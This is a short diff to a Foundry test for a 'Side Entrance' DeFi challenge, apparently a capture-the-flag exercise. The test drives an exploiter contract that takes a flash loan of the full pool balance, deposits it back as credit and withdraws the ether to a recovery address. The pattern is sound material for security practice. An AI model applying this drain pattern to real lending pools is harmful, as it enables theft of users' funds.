@@ -49,11 +49,18 @@ contract SideEntranceChallenge is Test {
         // Deploy exploiter contract
         SideEntranceExploiter exploiter = new SideEntranceExploiter(pool);
         
-        // Take flash loan for full pool balance
-        // This will trigger execute() which deposits the borrowed amount
-        pool.flashLoan(ETHER_IN_POOL);
+        // Verify initial state
+        assertEq(address(pool).balance, ETHER_IN_POOL);
+        assertEq(pool.balances(address(exploiter)), 0);
         
-        // Withdraw and send to recovery
+        // Take flash loan for full pool balance, deposit it, and withdraw to recovery
+        exploiter.attack();
+        
+        // Verify deposit worked
+        assertEq(pool.balances(address(exploiter)), ETHER_IN_POOL);
+        assertEq(address(pool).balance, ETHER_IN_POOL);
+        
+        // Withdraw to recovery
         exploiter.withdraw(recovery);
     }
 
